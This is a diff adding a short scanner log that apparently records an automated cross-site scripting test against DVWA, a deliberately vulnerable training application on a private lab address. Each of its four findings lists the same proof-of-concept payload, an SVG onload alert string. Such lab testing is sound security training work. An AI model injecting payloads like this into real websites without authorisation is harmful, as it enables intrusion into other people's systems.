@@ -1,0 +1,12 @@
+[+] XSS found in form: http://192.168.56.101/dvwa/vulnerabilities/sqli/
+ Used payload: <svg/onload=alert(11111)//
+
+[+] XSS found in form: http://192.168.56.101/dvwa/vulnerabilities/xss_r/
+ Used payload: <svg/onload=alert(11111)//
+
+[+] XSS found in form: http://192.168.56.101/dvwa/vulnerabilities/xss_s/
+ Used payload: <svg/onload=alert(11111)//
+
+[+] XSS found in url: http://192.168.56.101/dvwa/vulnerabilities/xss_s/
+Used payload: <svg/onload=alert(11111)//
+
